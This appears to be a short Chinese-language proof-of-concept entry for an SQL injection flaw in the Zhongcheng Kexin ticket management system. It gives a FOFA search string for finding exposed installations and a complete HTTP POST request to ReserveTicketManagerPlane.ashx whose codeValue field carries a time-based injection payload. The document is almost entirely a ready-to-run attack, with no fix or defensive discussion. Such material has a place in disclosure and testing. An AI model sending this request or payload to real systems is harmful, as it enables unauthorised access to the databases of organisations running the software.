## 中成科信票务管理系统ReserveTicketManagerPlane.ashx存在SQL注入漏洞

## fofa

```
body="技术支持：北京中成科信科技发展有限公司"
```

## poc

```
POST /SystemManager/Planetarium/ReserveTicketManagerPlane.ashx HTTP/1.1
Host: 
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Priority: u=1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 
Method=GetGuideByCode&inputType=20&codeValue=1';WAITFOR DELAY '0: 0: 5' --
```